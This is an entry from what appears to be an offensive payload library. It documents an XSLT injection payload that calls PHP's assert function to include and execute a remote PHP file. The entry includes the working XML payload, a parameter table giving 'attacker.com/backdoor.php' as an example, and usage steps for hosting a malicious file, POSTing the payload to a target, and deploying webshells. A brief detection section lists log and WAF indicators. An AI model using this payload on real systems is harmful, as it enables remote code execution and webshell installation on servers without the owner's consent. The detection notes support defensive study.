---
id: f75bb95d-094b-46fa-b02e-710cf366ba2d
name: xslt-php-assert-include-payload
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
  - PHP
tags:
  - xslt-injection
  - remote-include
  - rce
validated: true
---

# XSLT PHP Assert Include Payload

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:variable name="payload">
            include("http://10.10.10.10/test.php")
        </xsl:variable>
        <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

## Description

This XSLT payload leverages the PHP assert function to include and execute a remote PHP file, enabling arbitrary code execution. It stores the include statement in a variable and passes it to assert, which evaluates it during the transformation. The inline styles are optional camouflage.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "http://10.10.10.10/test.php" | URL of the remote PHP file to include | "http://attacker.com/backdoor.php" |

## Usage

Host a malicious PHP file on your server (e.g., with system commands) and POST this payload to the target. The included file executes server-side, with output reflected in the response. Use for deploying webshells or running one-off commands like info gathering.

## Detection

- Network logs showing HTTP requests from the web server to external IPs (indicating include).
- Assert function usage in PHP error logs or XSLT processing traces.
- WAF alerts on include statements or external URLs in XML variables.

## Related

- [[procedures/xslt-injection-for-php-remote-code-execution]]
- [[techniques/Remote File Copy|T1105]]
